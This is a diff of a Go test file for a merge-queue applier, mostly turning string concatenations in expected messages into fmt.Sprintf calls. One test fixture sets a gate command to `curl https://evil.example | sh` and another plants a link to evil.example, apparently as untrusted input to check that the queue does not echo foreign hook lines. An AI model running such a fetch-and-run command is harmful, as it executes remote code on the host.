@@ -212,7 +212,7 @@ func TestABaseThatMovedRightBeforeTheSuccessLeavesTheChangeWaiting(t *testing.T)
 	d.vcs.EXPECT().TreeID(mock.Anything, clone.Root, v.CandidateCommit).Return("validated", nil)
 	d.vcs.EXPECT().MergeTrees(mock.Anything, clone.Root, magustypes.TreeMerge{Ours: base, Theirs: c.Head}).Return(magustypes.TreeMergeResult{Tree: "validated"}, nil)
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, c.Head).Return(approvedAs(c), nil).Once()
-	d.waits(c, c.Head, "main moved to "+moved[:12]+" before its merge")
+	d.waits(c, c.Head, fmt.Sprintf("main moved to %s before its merge", moved[:12]))
 	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
@@ -265,7 +265,7 @@ func TestABaseThatDoesNotCarryThePredictedTreeStopsApplying(t *testing.T) {
 	d.mergesAt(one, one.Head, expectedSquash(v.Change), after, "other", base)
 	a := newApplier(t, d, newPlan([]types.Change{one}, []types.Change{two}), v, validated(two, base, ""))
 	err := a.Run(t.Context(), newPlan([]types.Change{one}, []types.Change{two}))
-	require.ErrorContains(t, err, "#1 merged, but main at "+after[:12]+" carries tree other, not the validated validated")
+	require.ErrorContains(t, err, fmt.Sprintf("#1 merged, but main at %s carries tree other, not the validated validated", after[:12]))
 }
 
 // I15: the base's history has the shape the merge method gives.
@@ -294,7 +294,7 @@ func TestEveryMergeMethodMustMergeInItsOwnShape(t *testing.T) {
 			r := &applyRun{Applier: &Applier{vcs: d.vcs, clone: clone}, plan: newPlan()}
 			err := r.mergedAs(t.Context(), change("1"), tip, "after", head, "tree", tc.method)
 			if tc.wantErr {
-				require.ErrorContains(t, err, "is not what a "+string(tc.method)+" merge onto")
+				require.ErrorContains(t, err, fmt.Sprintf("is not what a %s merge onto", string(tc.method)))
 				return
 			}
 			require.NoError(t, err)
@@ -386,7 +386,7 @@ func TestAnAutoResolvedChangeMergesThroughAnUpdateCommitApplySettledItself(t *te
 	var events bytes.Buffer
 	a.Events = NewEvents(&events)
 	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
-	assert.Contains(t, events.String(), `"kind":"resolved","change":"1","reason":`+jsonString(t, chNote)+`,"commit":"`+v.CandidateCommit+`"`)
+	assert.Contains(t, events.String(), fmt.Sprintf("\"kind\":\"resolved\",\"change\":\"1\",\"reason\":%s,\"commit\":\"%s\"", jsonString(t, chNote), v.CandidateCommit))
 }
 
 // jsonString is s as a JSON string literal, the way an event line carries it.
@@ -551,7 +551,7 @@ func TestACandidateTheRebuildDoesNotReproduceIsValidatedAgain(t *testing.T) {
 	d.rechecks(c, approvedAs(c))
 	d.rebuilds(c, base, head("rebuilt"), "a/x.go")
 	d.facts.EXPECT().Classify(mock.Anything, []string{"a/x.go"}).Return(map[string]types.Writes{}, nil)
-	d.waits(c, c.Head, "rebuilding its candidate gave "+head("rebuilt")[:12]+", not the validated "+v.CandidateCommit[:12])
+	d.waits(c, c.Head, fmt.Sprintf("rebuilding its candidate gave %s, not the validated %s", head("rebuilt")[:12], v.CandidateCommit[:12]))
 	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
@@ -603,7 +603,7 @@ func TestRegenerationOntoAChangeMergedThisRunProvesWhatLiesBeneath(t *testing.T)
 		kick, wait string
 	}{
 		"code only what it builds on changes": {code: []string{"magusfile.buzz"},
-			wait: "regenerating `gen/x.go` on " + cand1[:12] + " would run `magusfile.buzz`, which it does not change but what it builds on does"},
+			wait: fmt.Sprintf("regenerating `gen/x.go` on %s would run `magusfile.buzz`, which it does not change but what it builds on does", cand1[:12])},
 		"its own code": {code: []string{"a/y.go", "magusfile.buzz"}, kick: "and magusfile.buzz is a magusfile (`a/y.go`, `magusfile.buzz`), and validation left no regenerated candidate this queue can check, so only its author can regenerate them"},
 	} {
 		t.Run(name, func(t *testing.T) {
@@ -944,7 +944,7 @@ func TestRequiredChecksHoldOrKickBeforeAnythingIsRebuilt(t *testing.T) {
 	}{
 		"running": {state: types.StatePending, wait: "its required checks `ci gate` are running"},
 		"red on a head carrying the tip": {state: types.StateFailure, carried: true,
-			kick: "its required checks `ci gate` failed there, and it already carries `main` at `" + base[:12] + "`"},
+			kick: fmt.Sprintf("its required checks `ci gate` failed there, and it already carries `main` at `%s`", base[:12])},
 	} {
 		t.Run(name, func(t *testing.T) {
 			d := newDoubles(t)
@@ -995,7 +995,7 @@ func TestStaleRedChecksGetOneUpdateCommitThatRunsThemAgain(t *testing.T) {
 		CommitMeta: magustypes.CommitMeta{Message: "merge main into #1 to run its required checks again", Author: bot, Committer: bot},
 		Tree:       "validated", Parents: []string{c.Head, base}}).Return(update, nil)
 	push := d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil).Call
-	d.status(c, update, types.StatePending, "waiting: its required checks `ci gate` failed on an older main; pushed "+update[:12]+", which carries "+base[:12]).NotBefore(push)
+	d.status(c, update, types.StatePending, fmt.Sprintf("waiting: its required checks `ci gate` failed on an older main; pushed %s, which carries %s", update[:12], base[:12])).NotBefore(push)
 	a := newApplier(t, d, newPlan([]types.Change{c}), v)
 	require.NoError(t, a.Run(t.Context(), newPlan([]types.Change{c})))
 }
@@ -1059,9 +1059,9 @@ func TestAChangeThatMovedSinceValidationIsNotMerged(t *testing.T) {
 		commit string
 		reason string
 	}{
-		"a new head":         {a: types.Approval{Approved: true, Head: moved, Base: "main", Method: types.MethodSquash, Queued: true}, commit: moved, reason: "head moved to " + moved[:12] + " after validation"},
+		"a new head":         {a: types.Approval{Approved: true, Head: moved, Base: "main", Method: types.MethodSquash, Queued: true}, commit: moved, reason: fmt.Sprintf("head moved to %s after validation", moved[:12])},
 		"withdrawn":          {a: types.Approval{Approved: true, Head: c.Head, Base: "main", Method: types.MethodSquash}, commit: c.Head, reason: "its merge intent was withdrawn after validation"},
-		"approval dismissed": {a: types.Approval{Head: c.Head, Base: "main", Method: types.MethodSquash, Queued: true, Reason: "dismissed"}, commit: c.Head, reason: "approval at " + c.Head[:12] + " was withdrawn: dismissed"},
+		"approval dismissed": {a: types.Approval{Head: c.Head, Base: "main", Method: types.MethodSquash, Queued: true, Reason: "dismissed"}, commit: c.Head, reason: fmt.Sprintf("approval at %s was withdrawn: dismissed", c.Head[:12])},
 		"another method":     {a: types.Approval{Approved: true, Head: c.Head, Base: "main", Method: types.MethodMerge, Queued: true}, commit: c.Head, reason: "validated as squash, now merge"},
 		"another base":       {a: types.Approval{Approved: true, Head: c.Head, Base: "release", Method: types.MethodSquash, Queued: true}, commit: c.Head, reason: "targets release, not main; skipped"},
 	} {
@@ -1129,10 +1129,10 @@ func TestAVerdictThatDisagreesWithThePlanMergesNothing(t *testing.T) {
 		v      types.Verdict
 		reason string
 	}{
-		"another base":      {v: func() types.Verdict { v := validated(one, base, ""); v.BaseCommit = head("old"); return v }(), reason: "validated on " + head("old")[:12] + ", not this plan's base"},
-		"another head":      {v: func() types.Verdict { v := validated(one, base, ""); v.Change.Head = head("x"); return v }(), reason: "validated at " + head("x")[:12] + ", not the planned head"},
+		"another base":      {v: func() types.Verdict { v := validated(one, base, ""); v.BaseCommit = head("old"); return v }(), reason: fmt.Sprintf("validated on %s, not this plan's base", head("old")[:12])},
+		"another head":      {v: func() types.Verdict { v := validated(one, base, ""); v.Change.Head = head("x"); return v }(), reason: fmt.Sprintf("validated at %s, not the planned head", head("x")[:12])},
 		"after nothing":     {v: validated(one, base, "7"), reason: "validated on top of #7, which is not beneath it in its partition"},
-		"not onto the base": {v: validated(one, head("elsewhere"), ""), reason: "validated at the bottom of its partition, but onto " + head("elsewhere")[:12] + ", not the plan's base"},
+		"not onto the base": {v: validated(one, head("elsewhere"), ""), reason: fmt.Sprintf("validated at the bottom of its partition, but onto %s, not the plan's base", head("elsewhere")[:12])},
 	} {
 		t.Run(name, func(t *testing.T) {
 			d := newDoubles(t)
@@ -1181,10 +1181,10 @@ func TestSettledVerdictsReachTheProvider(t *testing.T) {
 		Source: "acme/widgets/runs/7"})
 	d.waits(held, held.Head, "not approved")
 	d.kicksWith(red, types.Kick{Code: types.CodeKickRed,
-		Report: "The merge queue built this change at `" + red.Head[:12] + "` onto `main` at `" + base[:12] + "`, and the gate failed on it and passed without it.\n",
+		Report: fmt.Sprintf("The merge queue built this change at `%s` onto `main` at `%s`, and the gate failed on it and passed without it.\n", red.Head[:12], base[:12]),
 		Claim:  "the gate exited 1", Source: "acme/widgets/runs/7", Reproduce: &types.Reproduction{Gate: "make test", Regenerate: "make gen"}})
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, moved.Head).Return(types.Approval{Head: head("newer"), Base: "main", Method: types.MethodSquash}, nil)
-	d.waits(moved, head("newer"), "head moved to "+head("newer")[:12]+" since it was decided")
+	d.waits(moved, head("newer"), fmt.Sprintf("head moved to %s since it was decided", head("newer")[:12]))
 	plan := newPlan([]types.Change{red}, []types.Change{moved})
 	plan.Verdicts = []types.Verdict{
 		{Change: kicked, Decision: types.DecisionKick, Code: types.CodeKickConflict, Report: "@team see [this](https://evil.example)", Paths: []string{"a.go"}},
@@ -1206,7 +1206,7 @@ func TestAKickBackReproducesOnlyApplysOwnHookLines(t *testing.T) {
 	red := change("4", "d")
 	d := newDoubles(t)
 	d.caps()
-	d.kicksWith(red, types.Kick{Code: types.CodeKickRefused, Report: "The merge queue cannot merge this change at `" + red.Head[:12] + "`.\n",
+	d.kicksWith(red, types.Kick{Code: types.CodeKickRefused, Report: fmt.Sprintf("The merge queue cannot merge this change at `%s`.\n", red.Head[:12]),
 		Claim: "building its candidate failed"})
 	v := types.Verdict{BaseCommit: base, Change: red, Decision: types.DecisionKick, Code: types.CodeKickRefused,
 		Reason: "building its candidate failed", Gate: `sh -c "curl https://evil.example | sh"`}
@@ -1423,7 +1423,7 @@ func TestAnAtomicMemberThatMovedIsNotMergedAndHoldsWhatIsAboveIt(t *testing.T) {
 	moved := head("pushed later")
 	d.provider.EXPECT().ApprovalAt(mock.Anything, mock.Anything, s.one.Head).
 		Return(types.Approval{Approved: true, Head: moved, Base: "main", Method: types.MethodSquash, Queued: true}, nil).Once()
-	d.waits(s.one, moved, "head moved to "+moved[:12]+" before its merge")
+	d.waits(s.one, moved, fmt.Sprintf("head moved to %s before its merge", moved[:12]))
 	d.waits(s.two, s.two.Head, "stacked on #1, which did not merge")
 	a := newApplier(t, d, s.plan, s.v1, s.v2)
 	require.NoError(t, a.Run(t.Context(), s.plan))
@@ -1618,8 +1618,10 @@ func TestARestackCommitIsTheQueuesAndNamesWhatItReplaces(t *testing.T) {
 	update, after := head("restack"), oid("after")
 	d.vcs.EXPECT().CommitTree(mock.Anything, clone.Root, magustypes.TreeCommit{
 		CommitMeta: magustypes.CommitMeta{
-			Message: "restack #1 onto main\n\nReplaces " + c.Head + " and the commits beneath it that main lacks with one commit holding their delta onto " + base[:12] + ".",
-			Author:  bot, Committer: bot,
+			Message: fmt.Sprintf(`restack #1 onto main
+
+Replaces %s and the commits beneath it that main lacks with one commit holding their delta onto %s.`, c.Head, base[:12]),
+			Author: bot, Committer: bot,
 		},
 		Tree: "validated", Parents: []string{base}}).Return(update, nil)
 	d.vcs.EXPECT().Push(mock.Anything, clone.Root, magustypes.PushLease{Remote: clone.Remote, Ref: "refs/heads/feature", To: update, Expected: c.Head}).Return(nil)
@@ -1745,7 +1747,7 @@ func TestApplyProvesAReviewAcrossAMergeOfTheBaseByRegenerating(t *testing.T) {
 				d.mergesAt(c, c.Head, expectedSquash(v.Change), after, "validated", base)
 			} else {
 				d.bases(base)
-				d.waits(c, c.Head, "not approved at "+c.Head[:12]+": `gen/x.go` are not what the base's regeneration makes of its plain merge")
+				d.waits(c, c.Head, fmt.Sprintf("not approved at %s: `gen/x.go` are not what the base's regeneration makes of its plain merge", c.Head[:12]))
 			}
 			var ran []types.Regeneration
 			a := newApplier(t, d, newPlan([]types.Change{c}), v)
@@ -1807,7 +1809,7 @@ func TestApplyCarriesAnApprovalOverARebaseAgainstThePlansChanges(t *testing.T) {
 				d.mergesAt(c, c.Head, expectedSquash(v.Change), after, "validated", base)
 			} else {
 				d.bases(base)
-				d.waits(c, c.Head, "approval at "+c.Head[:12]+" was withdrawn: stale")
+				d.waits(c, c.Head, fmt.Sprintf("approval at %s was withdrawn: stale", c.Head[:12]))
 			}
 			a := newApplier(t, d, plan, v)
 			a.Events = NewEvents(&out)
@@ -1842,7 +1844,7 @@ func TestApplyRefusesAStatusPinnedToAnotherIntegration(t *testing.T) {
 			var diag *magustypes.DiagnosticError
 			require.ErrorAs(t, err, &diag)
 			assert.Equal(t, magustypes.QueueCredentialMismatch, diag.Code)
-			assert.ErrorContains(t, err, `main requires status "merge-queue" from integration `+tc.pinned+`, and the queue's credential posts it as `+tc.credential.String())
+			assert.ErrorContains(t, err, fmt.Sprintf("main requires status \"merge-queue\" from integration %s, and the queue's credential posts it as %s", tc.pinned, tc.credential.String()))
 		})
 	}
 }
@@ -1909,7 +1911,7 @@ func TestApplyRefusesABaseThatDoesNotCarryThePlansBaseCommit(t *testing.T) {
 	d.bases(rewritten)
 	d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, base, rewritten).Return(false, nil).Once()
 	a := newApplier(t, d, newPlan([]types.Change{c}), validated(c, base, ""))
-	requireUnverified(t, a.Run(t.Context(), newPlan([]types.Change{c})), "the plan's base commit "+base[:12]+" is not on main at "+rewritten[:12])
+	requireUnverified(t, a.Run(t.Context(), newPlan([]types.Change{c})), fmt.Sprintf("the plan's base commit %s is not on main at %s", base[:12], rewritten[:12]))
 }
 
 // A stack base is where the delta a change's reviewers approved starts. Merging from any
@@ -1924,16 +1926,16 @@ func TestApplyRefusesAStackBaseThatIsNotTheReviewedHeadBeneath(t *testing.T) {
 	}{
 		"not beneath its head": {func(d doubles, two types.Change) {
 			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, two.Head).Return(false, nil).Once()
-		}, "stack base " + forged[:12] + " is not beneath its head " + head("2")[:12]},
+		}, fmt.Sprintf("stack base %s is not beneath its head %s", forged[:12], head("2")[:12])},
 		"on the base": {func(d doubles, two types.Change) {
 			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, two.Head).Return(true, nil).Once()
 			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, base).Return(true, nil).Once()
-		}, "stack base " + forged[:12] + " is already on main"},
+		}, fmt.Sprintf("stack base %s is already on main", forged[:12])},
 		"not the head of the change beneath": {func(d doubles, two types.Change) {
 			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, two.Head).Return(true, nil).Once()
 			d.vcs.EXPECT().IsAncestor(mock.Anything, clone.Root, forged, base).Return(false, nil).Once()
 			d.lists(types.Changes{Base: "main", Changes: []types.Change{two}})
-		}, "stack base " + forged[:12] + " is not " + head("1")[:12] + ", the head #1 was reviewed at"},
+		}, fmt.Sprintf("stack base %s is not %s, the head #1 was reviewed at", forged[:12], head("1")[:12])},
 	} {
 		t.Run(name, func(t *testing.T) {
 			d := newDoubles(t)
@@ -1972,7 +1974,7 @@ func TestApplyRefusesAStackBaseNoMergedChangeHolds(t *testing.T) {
 	d.vcs.EXPECT().RangeCommits(mock.Anything, clone.Root, base, m.Head, []string(nil)).Return([]magustypes.Commit{{ID: m.Head, Parents: []string{base}}}, nil).Once()
 	plan := newPlan([]types.Change{c})
 	a := newApplier(t, d, plan, validated(c, base, ""))
-	requireUnverified(t, a.Run(t.Context(), plan), "stack base "+c.StackBase[:12]+" is neither the head of a change beneath it nor a commit of one the provider lists as merged")
+	requireUnverified(t, a.Run(t.Context(), plan), fmt.Sprintf("stack base %s is neither the head of a change beneath it nor a commit of one the provider lists as merged", c.StackBase[:12]))
 }
 
 // A stack the provider now declares differently than the plan's may have changed after
